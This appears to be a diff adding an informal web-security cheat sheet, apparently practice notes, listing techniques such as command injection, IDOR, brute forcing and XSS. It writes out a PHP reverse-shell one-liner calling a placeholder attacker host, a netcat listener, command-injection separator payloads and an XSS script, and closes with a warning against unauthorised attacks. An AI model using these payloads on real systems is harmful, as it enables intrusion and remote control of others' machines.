@@ -1,0 +1,60 @@
+	CONGRATULATIONS YOU FOUND A TRESSURE ! 😂✨
+
+HTML INJECTION 💉
+BRUTE FORCING (Burp suite - intruder) 🔥
+COMMAND INJECTION 💉
+
+   #php reverse shell
+  	* php -r '$sock=fsockopen("ipofattackbox",1234);exec("/bin/bash -i <&3 >& 3 2>& 3");'
+
+   #Listening 
+   nc -lvp 1234
+
+
+   ######################
+
+   #2 (ping free)
+
+   8.8.8.8 && command2inject
+   8.8.8.8 ; command2inject
+   8.8.8.8 & command2inject
+   8.8.8.8 | command2inject
+
+BROKEN AUTHENTICATION 🔓
+1# change the uid to '1' to get admin access in GET request
+2# Web Goat basic authentication 
+3# Web Goat forgott password brute force color (burpsuite)
+
+
+SENSITIVE DATA EXPOSURE 🔓
+#1 Check whether any data is exposed by dev in source code
+#2 Check if any passwords usernames or hidden dir available
+
+BROKEN AUTHENTICATION (IDOR) 🔓
+#1 If the url is https://example.com/bank?account_number=1234
+#2 Try to change the digits after 'account_number='
+
+SECURITY MISCONFIGURATION 🔓
+#1 Try default passwords (maybe available online)
+#3 Maybe the devs forgot to delete pass/usrname in code 🤓🤦
+
+XSS 👩‍💻
+# Stored XSS stored in the database 
+# Reflected XSS reflected in the client side 
+# Eg: <script>alert("This site is H4CKED !")</script>
+# Visit : http://www.xss-payloads.com/ for more payloads
+
+H4CK | EXPLOIT
+# Just find version of the service used if its old 
+# Check for vulnerabilities
+# If found one search for scripts to exploit 
+# Download and H4CK WITH PERMISSION 😊
+
+
+##########################🔥HAPPY HACKING🔥####################
+
+(*) oNE LASt THING TO SAY BRO PLEASE DON'T WASTE YOUR LIFE ON IT 
+JUST PLEASE DON'T ATTACK ANYONE OR ANY COMPANY WITHOUT THEIR PERMISSION 
+YOU WILL GO TO JAIL (ITS A CRIME).
+😢 D0N'T DO IT TO YOUR SELF !
+ Think about ur loved ones they want you ! 🥺
